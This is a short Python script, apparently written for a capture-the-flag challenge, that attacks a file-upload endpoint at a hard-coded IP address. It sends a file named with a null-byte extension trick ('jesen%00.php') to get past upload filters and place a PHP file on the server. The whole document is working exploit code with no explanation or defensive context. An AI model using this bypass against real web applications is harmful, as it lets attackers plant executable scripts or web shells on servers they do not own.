# coding=utf-8
import io,base64
import requests
import threading

url = "http://124.71.239.155:24499/?ctf=upload"

def attack(session):
        with open("./upload.png","rb") as f:
            resp = session.post(url,
                                data={'ss': 'upload'},
                                files={'postedFile': ("jesen%00.php", f)})
            print(resp.text)

if __name__ == "__main__":
    with requests.session() as session:
        attack(session)
